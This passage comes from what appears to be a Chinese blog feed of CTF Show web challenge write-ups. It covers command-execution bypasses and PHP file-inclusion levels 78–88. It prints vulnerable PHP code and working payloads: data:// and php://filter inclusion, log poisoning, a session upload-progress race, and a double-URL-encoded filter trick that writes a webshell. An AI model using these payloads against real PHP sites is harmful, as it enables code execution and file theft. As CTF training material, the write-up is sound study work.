Socket type not supported&quot;</span><span class="string">&quot;OS error code  95:  Operation not supported&quot;</span><span class="string">&quot;OS error code  96:  Protocol family not supported&quot;</span><span class="string">&quot;OS error code  97:  Address family not supported by protocol&quot;</span><span class="string">&quot;OS error code  98:  Address already in use&quot;</span><span class="string">&quot;OS error code  99:  Cannot assign requested address&quot;</span><span class="string">&quot;OS error code 100:  Network is down&quot;</span><span class="string">&quot;OS error code 101:  Network is unreachable&quot;</span><span class="string">&quot;OS error code 102:  Network dropped connection on reset&quot;</span><span class="string">&quot;OS error code 103:  Software caused connection abort&quot;</span><span class="string">&quot;OS error code 104:  Connection reset by peer&quot;</span><span class="string">&quot;OS error code 105:  No buffer space available&quot;</span><span class="string">&quot;OS error code 106:  Transport endpoint is already connected&quot;</span><span class="string">&quot;OS error code 107:  Transport endpoint is not connected&quot;</span><span class="string">&quot;OS error code 108:  Cannot send after transport endpoint shutdown&quot;</span><span class="string">&quot;OS error code 109:  Too many references: cannot splice&quot;</span><span class="string">&quot;OS error code 110:  Connection timed out&quot;</span><span class="string">&quot;OS error code 111:  Connection refused&quot;</span><span class="string">&quot;OS error code 112:  Host is down&quot;</span><span class="string">&quot;OS error code 113:  No route to host&quot;</span><span class="string">&quot;OS error code 114:  Operation already in progress&quot;</span><span class="string">&quot;OS error code 115:  Operation now in progress&quot;</span><span class="string">&quot;OS error code 116:  Stale NFS file handle&quot;</span><span class="string">&quot;OS error code 117:  Structure needs cleaning&quot;</span><span class="string">&quot;OS error code 118:  Not a XENIX named type file&quot;</span><span class="string">&quot;OS error code 119:  No XENIX semaphores available&quot;</span><span class="string">&quot;OS error code 120:  Is a named type file&quot;</span><span class="string">&quot;OS error code 121:  Remote I/O error&quot;</span><span class="string">&quot;OS error code 122:  Disk quota exceeded&quot;</span><span class="string">&quot;OS error code 123:  No medium found&quot;</span><span class="string">&quot;OS error code 124:  Wrong medium type&quot;</span><span class="string">&quot;OS error code 125:  Operation canceled&quot;</span><span class="string">&quot;OS error code 126:  Required key not available&quot;</span><span class="string">&quot;OS error code 127:  Key has expired&quot;</span><span class="string">&quot;OS error code 128:  Key has been revoked&quot;</span><span class="string">&quot;OS error code 129:  Key was rejected by service&quot;</span><span class="string">&quot;OS error code 130:  Owner died&quot;</span><span class="string">&quot;OS error code 131:  State not recoverable&quot;</span><span class="string">&quot;MySQL error code 132: Old database file&quot;</span><span class="string">&quot;MySQL error code 133: No record read before update&quot;</span><span class="string">&quot;MySQL error code 134: Record was already deleted (or record file crashed)&quot;</span><span class="string">&quot;MySQL error code 135: No more room in record file&quot;</span><span class="string">&quot;MySQL error code 136: No more room in index file&quot;</span><span class="string">&quot;MySQL error code 137: No more records (read after end of file)&quot;</span><span class="string">&quot;MySQL error code 138: Unsupported extension used for table&quot;</span><span class="string">&quot;MySQL error code 139: Too big row&quot;</span><span class="string">&quot;MySQL error code 140: Wrong create options&quot;</span><span class="string">&quot;MySQL error code 141: Duplicate unique key or constraint on write or update&quot;</span><span class="string">&quot;MySQL error code 142: Unknown character set used&quot;</span><span class="string">&quot;MySQL error code 143: Conflicting table definitions in sub-tables of MERGE table&quot;</span><span class="string">&quot;MySQL error code 144: Table is crashed and last repair failed&quot;</span><span class="string">&quot;MySQL error code 145: Table was marked as crashed and should be repaired&quot;</span><span class="string">&quot;MySQL error code 146: Lock timed out; Retry transaction&quot;</span><span class="string">&quot;MySQL error code 147: Lock table is full;  Restart program with a larger locktable&quot;</span><span class="string">&quot;MySQL error code 148: Updates are not allowed under a read only transactions&quot;</span><span class="string">&quot;MySQL error code 149: Lock deadlock; Retry transaction&quot;</span><span class="string">&quot;MySQL error code 150: Foreign key constraint is incorrectly formed&quot;</span><span class="string">&quot;MySQL error code 151: Cannot add a child row&quot;</span><span class="string">&quot;MySQL error code 152: Cannot delete a parent row&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span></span><br></pre></td></tr></table></figure><p>多多刷新</p><p>可以脚本尝试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsurl = <span class="string">&#x27;http://dd95c86c-d3bc-4b4b-a9f1-6ad337b0fa51.challenge.ctf.show:8080/&#x27;</span>data1 = &#123;<span class="string">&#x27;code&#x27;</span>:r<span class="string">&#x27;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???&#x27;</span>&#125;<span class="keyword">while</span> True:    res = requests.post(url,data = data1)    <span class="keyword">if</span> <span class="string">&quot;PD9waHA&quot;</span> <span class="keyword">in</span> res.text:        <span class="built_in">print</span>(res.text)        <span class="built_in">break</span></span><br></pre></td></tr></table></figure><h2 id="1-56-Web-124-—-base-convert-getallheaders"><a href="#1-56-Web-124-—-base-convert-getallheaders" class="headerlink" title="1.56 Web 124 —  base_convert  |  getallheaders"></a>1.56 Web 124 —  base_convert  |  getallheaders</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    show_source(__FILE__);&#125;<span class="keyword">else</span>&#123;    //例子 c=20-1    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= 80) &#123;        die(<span class="string">&quot;太长了不会算&quot;</span>);    &#125;    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];    foreach (<span class="variable">$blacklist</span> as <span class="variable">$blackitem</span>) &#123;        if (preg_match(&#x27;/&#x27; . <span class="variable">$blackitem</span> . &#x27;/m&#x27;, <span class="variable">$content</span>)) &#123;            die(&quot;</span>请不要输入奇奇怪怪的字符<span class="string">&quot;);        &#125;    &#125;    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp    <span class="variable">$whitelist</span> = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);      foreach (<span class="variable">$used_funcs</span>[0] as <span class="variable">$func</span>) &#123;        if (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;            die(&quot;</span>请不要输入奇奇怪怪的函数<span class="string">&quot;);        &#125;    &#125;    //帮你算出答案    eval(&#x27;echo &#x27;.<span class="variable">$content</span>.&#x27;;&#x27;);&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];1. 长度限制2. 黑名单，白名单3. <span class="built_in">eval</span>()命令执行</span><br></pre></td></tr></table></figure><p><strong>base_convert</strong></p><p><img src="https://i.loli.net/2021/08/10/Y6bwlONZ3xSaEuy.png" alt="image-20210810123419019"></p><p><strong>getallheaders</strong></p><p><img src="https://i.loli.net/2021/08/10/wl4qGscBUVZoTKp.png" alt="image-20210810123452311"></p><p>**方法一：构造 <code>_GET</code> **</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?acos=system&amp;asin=ls /&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;acos&#125;($$pi&#123;asin&#125;)?acos=system&amp;asin=cat /flag&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;acos&#125;($$pi&#123;asin&#125;)</span></span><br></pre></td></tr></table></figure><p><strong>方法二：利用 <code>getallheaders()</code> 更改请求头信息</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a</span><br></pre></td></tr></table></figure><p>然后抓包，写入 <code>1:ls /</code></p><p><img src="https://i.loli.net/2021/08/10/oEVxN76kPBbT8hS.png" alt="image-20210810124833920"></p><h1 id="二、总结"><a href="#二、总结" class="headerlink" title="二、总结"></a>二、总结</h1><p>Web 29-36  eval()</p><p>Web 37-39 include</p><p>Web 40 无参函数 套娃</p><p>Web 41 没写</p><p>Web 42-52   “ &gt;/dev/null 2&gt;&amp;1”</p><p>Web 53-54 system()</p><p>Web 55 /bin/</p><p>Web 56-57 [a-z] [0-9] </p><p>Web 58-124</p><p>php://filter/read=convert.base64-encode/resource=flag.php 中的 flag.php 不能使用通配符，改为 data://协议利用</p><p>参考博客</p><p><a href="https://blog.csdn.net/rfrder/article/details/112862827">https://blog.csdn.net/rfrder/article/details/112862827</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/109772962">https://blog.csdn.net/rfrder/article/details/109772962</a></p><p><a href="https://blog.csdn.net/njh18790816639/article/details/115580408">https://blog.csdn.net/njh18790816639/article/details/115580408</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/112862827">https://blog.csdn.net/rfrder/article/details/112862827</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、CTF-Show-—-命令执行&quot;&gt;&lt;a href=&quot;#一、CTF-Show-—-命令执行&quot; class=&quot;headerlink&quot; title=&quot;一、CTF Show — 命令执行&quot;&gt;&lt;/a&gt;一、CTF Show — 命令执行&lt;/h1&gt;&lt;h2 id=&quot;1-1-W</summary>
      
    
    
    
    <category term="CTF Show" scheme="https://xizhi-future.github.io/categories/CTF-Show/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Show-文件包含</title>
    <link href="https://xizhi-future.github.io/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://xizhi-future.github.io/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2021-10-01T11:12:49.000Z</published>
    <updated>2021-10-01T11:14:02.300Z</updated>
    
    <content type="html"><![CDATA[<p>CTF Show 文件包含篇。</p><span id="more"></span><h1 id="一、CTF-Show-—-文件包含"><a href="#一、CTF-Show-—-文件包含" class="headerlink" title="一、CTF Show — 文件包含"></a>一、CTF Show — 文件包含</h1><h2 id="1-1-Web-78-—-最简单的文件包含-—-各种伪协议-绕过"><a href="#1-1-Web-78-—-最简单的文件包含-—-各种伪协议-绕过" class="headerlink" title="1.1 Web 78 — 最简单的文件包含 — 各种伪协议 绕过"></a>1.1 Web 78 — 最简单的文件包含 — 各种伪协议 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br><span class="line">?file=data://text/plain,&lt;?php system(<span class="string">&#x27;cat flag.php&#x27;</span>); ?&gt;<span class="comment">#查看源代码</span></span><br><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br><span class="line"><span class="comment">#PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=内容是&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="1-2-Web-79-—-过滤-php-—-data-base64-绕过"><a href="#1-2-Web-79-—-过滤-php-—-data-base64-绕过" class="headerlink" title="1.2 Web 79 — 过滤 php — data:// base64 绕过"></a>1.2 Web 79 — 过滤 php — data:// base64 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br></pre></td></tr></table></figure><h2 id="1-3-Web-80-—-过滤-php、data-—-日志文件包含（同时写上代码）"><a href="#1-3-Web-80-—-过滤-php、data-—-日志文件包含（同时写上代码）" class="headerlink" title="1.3 Web 80 — 过滤 php、data — 日志文件包含（同时写上代码）"></a>1.3 Web 80 — 过滤 php、data — 日志文件包含（同时写上代码）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抓包可知：nginx 服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#包含日志文件</span></span><br><span class="line">?file=/var/<span class="built_in">log</span>/nginx/access.log</span><br><span class="line">写入php代码</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/16/z4KZLdVwSmr8nH9.png" alt="image-20210716215042378"></p><p><img src="https://i.loli.net/2021/10/01/VW871dxkePXusAl.png" alt="image-20210716215142577"></p><h2 id="1-4-Web-81-—-过滤-php、data、-—-日志文件包含（同时写上代码）"><a href="#1-4-Web-81-—-过滤-php、data、-—-日志文件包含（同时写上代码）" class="headerlink" title="1.4 Web 81 —  过滤 php、data、: — 日志文件包含（同时写上代码）"></a>1.4 Web 81 —  过滤 php、data、: — 日志文件包含（同时写上代码）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#同上，日志包含</span></span><br></pre></td></tr></table></figure><h2 id="1-5-Web-82-86-—-过滤-php、data、-、-—-SESSION-文件包含"><a href="#1-5-Web-82-86-—-过滤-php、data、-、-—-SESSION-文件包含" class="headerlink" title="1.5 Web 82-86 —  过滤 php、data、: 、. — SESSION 文件包含"></a>1.5 Web 82-86 —  过滤 php、data、: 、. — SESSION 文件包含</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="keyword">include</span>(<span class="variable">$file</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=<span class="string">&quot;http://708cd0ba-4c4a-40c7-b53c-0dca6ac256fe.challenge.ctf.show:8080/&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;123&quot;</span> /&gt;    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>任意上传一个文件</p><p><img src="https://i.loli.net/2021/07/19/wez3hdLsB7DfiOa.png" alt="image-20210719173916491"></p><p><img src="https://i.loli.net/2021/07/19/Ix5UvQDhOEAqlKr.png" alt="image-20210719173943208"></p><p><img src="https://i.loli.net/2021/07/19/Nz4CGTBXFSsowMt.png" alt="image-20210719173601510"></p><p><img src="https://i.loli.net/2021/07/19/ptBEzodScA4rYuq.png" alt="image-20210719173814926"></p><h2 id="利用-session-upload-progress-进行文件包含利用"><a href="#利用-session-upload-progress-进行文件包含利用" class="headerlink" title="利用 session.upload_progress 进行文件包含利用"></a>利用 session.upload_progress 进行文件包含利用</h2><p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p><p><a href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p><p><strong>目的：利用 session.upload_progress 将木马写入 session 文件，然后包含 session 文件</strong></p><ul><li><p>创建 session 文件（无 session_start() ）</p><ul><li><p>选项 <code>session.auto_start=On</code>  ，PHP在接收请求时会自动初始化 Session，不需要执行 session_start()。默认情况下，该选项 <code>关闭</code> 。</p></li><li><p>选项 <code>session.use_strict_mode=0</code> ，默认值是0即未启动时，用户可以自定义 session。</p><p>方法：用户自己抓包，在 Cookie 里面设置，PHPSESSION=flag，那么PHP将会在服务器上也创建一个文件 <code>/tmp/sess_flag</code>  。这时用户并没有初始化 session ，php也照样自动初始化 session，而产生了一个键值，该键值由 <code>ini.get(&quot;session.upload_progress.prefix&quot;)+我们构造的session.upload_progress.name</code> 一起组成，最终写入 <code>sess_文件</code> li里。</p><p>linux 下，session文件一般的默认存储位置是 <code>/tmp 或 /var/lib/php/session</code></p></li></ul></li><li><p>避免 <code>session.upload_progress.cleanup=on</code> 的干扰</p><p>该选项导致文件成功上传之后，一旦读取 POST 信息之后，会清除进度信息，session 文件将会被立即清理。重点是 该选项默认开启。</p><ul><li>方法：<strong>条件竞争</strong></li></ul></li></ul><p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201010194658099-100509760.png" alt="img"></p><p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201010195459494-303350987.png" alt="img"></p><h2 id="1-6-Web-87-—-过滤-php、data、-、-—-死亡绕过"><a href="#1-6-Web-87-—-过滤-php、data、-、-—-死亡绕过" class="headerlink" title="1.6 Web 87 — 过滤 php、data、: 、.  — 死亡绕过"></a>1.6 Web 87 — 过滤 php、data、: 、.  — 死亡绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);    &#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># post?content=aaPD9waHAgc3lzdGVtKCdscycpOyA/Pg==# PD9waHAgc3lzdGVtKCdscycpOyA/Pg== 是 &lt;?php system(&#x27;ls&#x27;); ?&gt;#file=php://filter/write=convert.base64-decode/resource=1.php</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php://filter/write=convert.base64-decode/resource=1.php# 进行 url双编码# get?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/20/U2oHgyTDBpAMsCu.png" alt="image-20210720113808797"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更改 content ?content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4=#解码是 &lt;?php system(&#x27;cat fl0g.php&#x27;); ?&gt;</span></span><br></pre></td></tr></table></figure><p>访问得到</p><p><img src="https://i.loli.net/2021/10/01/OpuNI68AKWTye52.png" alt="image-20210720113952940"></p><h2 id="1-7-Web-88-—-过滤-—-拼凑-php-语句"><a href="#1-7-Web-88-—-过滤-—-拼凑-php-语句" class="headerlink" title="1.7 Web 88 — 过滤 + = — 拼凑 php 语句"></a>1.7 Web 88 — 过滤 + = — 拼凑 php 语句</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);    &#125;    <span class="keyword">include</span>(<span class="variable">$file</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意不能出现= 和 +?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/PmFi# PD9waHAgc3lzdGVtKCdscycpOyA/PmFi 解码是 &lt;?php system(&#x27;ls&#x27;); ?&gt;ab</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz5h<span class="comment"># 